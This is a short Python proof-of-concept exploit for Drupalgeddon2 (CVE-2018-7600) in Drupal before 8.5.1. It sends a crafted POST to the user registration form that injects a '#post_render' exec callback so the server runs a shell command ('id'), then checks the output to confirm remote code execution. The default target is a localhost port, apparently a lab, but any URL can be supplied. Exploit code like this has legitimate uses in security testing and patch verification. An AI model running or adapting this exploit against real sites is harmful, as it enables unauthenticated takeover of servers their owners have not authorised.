#!/usr/bin/env python3
"""
Drupalgeddon2 (CVE-2018-7600) PoC
Unauthenticated RCE via form API rendering vulnerability in Drupal < 8.5.1
"""
import sys
import urllib.request
import urllib.parse
import json

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2018-7600 - Drupalgeddon2 RCE")
    print()

    payload_url = f"{target_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

    data = urllib.parse.urlencode({
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': 'id',
    }).encode()

    print(f"[*] Sending payload to: {payload_url}")

    try:
        req = urllib.request.Request(payload_url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        response = urllib.request.urlopen(req, timeout=10)
        body = response.read().decode('utf-8', errors='replace')

        print(f"[+] Response status: {response.status}")
        print(f"[+] Response body:")
        print(body[:2000])

        if 'uid=' in body or 'gid=' in body:
            print()
            print("[+] SUCCESS: Remote code execution confirmed!")
        else:
            print()
            print("[!] Exploit sent but no clear RCE confirmation in response")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9021"
    exploit(url)
